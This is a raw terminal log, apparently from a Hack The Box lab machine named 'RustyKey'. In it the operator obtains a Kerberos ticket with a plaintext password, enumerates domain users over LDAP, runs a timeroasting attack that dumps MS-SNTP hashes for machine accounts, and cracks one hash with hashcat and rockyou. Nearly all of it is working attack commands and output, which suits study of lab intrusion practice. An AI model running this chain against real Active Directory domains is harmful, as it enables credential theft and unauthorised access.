ff() {
  faketime "$(ntpdate -q 10.10.11.75 | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" "$@"
}
---
└─$ ff impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in rr.parker.ccache

┌──(batman㉿ikal)-[~/htb]
└─$ klist
Ticket cache: FILE:./rr.parker.ccache
Default principal: rr.parker@RUSTYKEY.HTB

Valid starting       Expires              Service principal
08/19/2025 10:35:34  08/19/2025 20:35:34  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
        renew until 08/20/2025 10:35:34

┌──(batman㉿ikal)-[~/htb]
└─$ nxc ldap 10.10.11.75 -d rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A'  -k --users
LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.10.11.75     389    DC               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A KRB_AP_ERR_SKEW

┌──(batman㉿ikal)-[~/htb]
└─$ ff nxc ldap 10.10.11.75 -d rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A'  -k --users
LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
LDAP        10.10.11.75     389    DC               [*] Enumerated 11 domain users: rustykey.htb
LDAP        10.10.11.75     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.10.11.75     389    DC               Administrator                 2025-06-04 18:52:22 0        Built-in account for administering the computer/domain
LDAP        10.10.11.75     389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.10.11.75     389    DC               krbtgt                        2024-12-26 19:53:40 0        Key Distribution Center Service Account
LDAP        10.10.11.75     389    DC               rr.parker                     2025-06-04 18:54:15 0
LDAP        10.10.11.75     389    DC               mm.turner                     2024-12-27 05:18:39 0
LDAP        10.10.11.75     389    DC               bb.morgan                     2025-08-19 10:31:42 0
LDAP        10.10.11.75     389    DC               gg.anderson                   2025-08-19 10:31:42 0
LDAP        10.10.11.75     389    DC               dd.ali                        2025-08-19 10:31:42 0
LDAP        10.10.11.75     389    DC               ee.reed                       2025-08-19 10:31:42 0
LDAP        10.10.11.75     389    DC               nn.marcos                     2024-12-27 06:34:50 0
LDAP        10.10.11.75     389    DC               backupadmin                   2024-12-29 19:30:18 0
---
ff nxc smb 10.10.11.75 -d rustykey.htb -u 'rr.parker'  -k -M timeroast
ntpdig: no eligible servers
SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
TIMEROAST   10.10.11.75     445    10.10.11.75      [*] Starting Timeroasting...
TIMEROAST   10.10.11.75     445    10.10.11.75      1000:$sntp-ms$6d3325a97acc656ce962e27b0fd54a9a$1c0111e900000000000a17304c4f434cec4ee6117f399c03e1b8428bffbfcd0aec4f04a44f18c197ec4f04a44f18e4d3
TIMEROAST   10.10.11.75     445    10.10.11.75      1103:$sntp-ms$d1b76fe60d8dc9e5d06112a18bc4439b$1c0111e900000000000a17314c4f434cec4ee61180bf94d5e1b8428bffbfcd0aec4f04a4e4968943ec4f04a4e496aad1
TIMEROAST   10.10.11.75     445    10.10.11.75      1104:$sntp-ms$2060a8a71e8c687caa6312a97ecb2bc9$1c0111e900000000000a17314c4f434cec4ee6117e1a3d98e1b8428bffbfcd0aec4f04a4e609c220ec4f04a4e609e8b7
TIMEROAST   10.10.11.75     445    10.10.11.75      1105:$sntp-ms$dc5860eb5b7241ea1b257f81d74ec93f$1c0111e900000000000a17314c4f434cec4ee6117f6d23efe1b8428bffbfcd0aec4f04a4e75ca51cec4f04a4e75cd0bb
TIMEROAST   10.10.11.75     445    10.10.11.75      1106:$sntp-ms$e442293b6e601308739840c3c25830d4$1c0111e900000000000a17314c4f434cec4ee61180dba684e1b8428bffbfcd0aec4f04a4e8cb295eec4f04a4e8cb51a2
TIMEROAST   10.10.11.75     445    10.10.11.75      1107:$sntp-ms$cefdc181da7082aeafe56e0ad3fd773c$1c0111e900000000000a17314c4f434cec4ee6117e308ae2e1b8428bffbfcd0aec4f04a4ea38a2deec4f04a4ea38cb22
TIMEROAST   10.10.11.75     445    10.10.11.75      1118:$sntp-ms$9df53ff59b7df766348dc43e9098f0e2$1c0111e900000000000a17314c4f434cec4ee611804e2a2fe1b8428bffbfcd0aec4f04a4fc3576daec4f04a4fc35a781
TIMEROAST   10.10.11.75     445    10.10.11.75      1119:$sntp-ms$09c5c2ee1f8c8e12d5a47b54be753d79$1c0111e900000000000a17314c4f434cec4ee61180589fd4e1b8428bffbfcd0aec4f04a4fc3ff9ebec4f04a4fc40181e
TIMEROAST   10.10.11.75     445    10.10.11.75      1120:$sntp-ms$408f846521e4847f4873b98a861fbb4c$1c0111e900000000000a17314c4f434cec4ee6117db12c5de1b8428bffbfcd0aec4f04a4fdb11332ec4f04a4fdb139c9
TIMEROAST   10.10.11.75     445    10.10.11.75      1121:$sntp-ms$1a38e21989a2ab53734eca7de8d229b9$1c0111e900000000000a17314c4f434cec4ee6117e7b4af9e1b8428bffbfcd0aec4f04a4fe7b337dec4f04a4fe7b5a13
TIMEROAST   10.10.11.75     445    10.10.11.75      1122:$sntp-ms$d558aa402887295fbba6ef1e735ae538$1c0111e900000000000a17314c4f434cec4ee61180025bfae1b8428bffbfcd0aec4f04a5000242d0ec4f04a500026b14
TIMEROAST   10.10.11.75     445    10.10.11.75      1123:$sntp-ms$59dce600fb67a5279d1ed661cd23026e$1c0111e900000000000a17314c4f434cec4ee6117dd1569fe1b8428bffbfcd0aec4f04a501a8495fec4f04a501a86e48
TIMEROAST   10.10.11.75     445    10.10.11.75      1124:$sntp-ms$3bc13c21ca80dfd9b92666d96fbff7be$1c0111e900000000000a17314c4f434cec4ee61181c7dca3e1b8428bffbfcd0aec4f04a5059ecdb6ec4f04a5059ef5f9
TIMEROAST   10.10.11.75     445    10.10.11.75      1125:$sntp-ms$285e7a9c030578637343202ae658be21$1c0111e900000000000a17314c4f434cec4ee6117e2508cee1b8428bffbfcd0aec4f04a506148d55ec4f04a50614b3ec
TIMEROAST   10.10.11.75     445    10.10.11.75      1126:$sntp-ms$19582bc0a4354f4ec24c8bf52be24af4$1c0111e900000000000a17314c4f434cec4ee6117e8567b3e1b8428bffbfcd0aec4f04a50674ede8ec4f04a5067512d1
TIMEROAST   10.10.11.75     445    10.10.11.75      1127:$sntp-ms$a1f70dd62d7c380b6730054d2a027ac6$1c0111e900000000000a17314c4f434cec4ee6117da64eb3e1b8428bffbfcd0aec4f04a509ae5c9fec4f04a509ae924f


┌──(batman㉿ikal)-[~/htb/hashcat-7.1.0]
└─$ ./hashcat.bin ../l /usr/share/wordlists/rockyou.txt
hashcat (v7.1.0) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-penryn-QEMU Virtual CPU version 2.5+, 1470/2940 MB (512 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

31300 | MS SNTP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 16 digests; 16 unique digests, 16 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 513 MB (2693 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 31300 (MS SNTP)
Hash.Target......: ../l
Time.Started.....: Tue Aug 19 02:20:15 2025 (11 secs)
Time.Estimated...: Tue Aug 19 02:20:47 2025 (21 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  6966.3 kH/s (0.51ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 0/16 (0.00%) Digests (total), 0/16 (0.00%) Digests (new), 0/16 (0.00%) Salts
Progress.........: 79364096/229510160 (34.58%)
Rejected.........: 0/79364096 (0.00%)
Restore.Point....: 4960256/14344385 (34.58%)
Restore.Sub.#01..: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: oakvillestaples -> o1033895

$sntp-ms$285e7a9c030578637343202ae658be21$1c0111e900000000000a17314c4f434cec4ee6117e2508cee1b8428bffbfcd0aec4f04a506148d55ec4f04a50614b3ec:Rusty88!
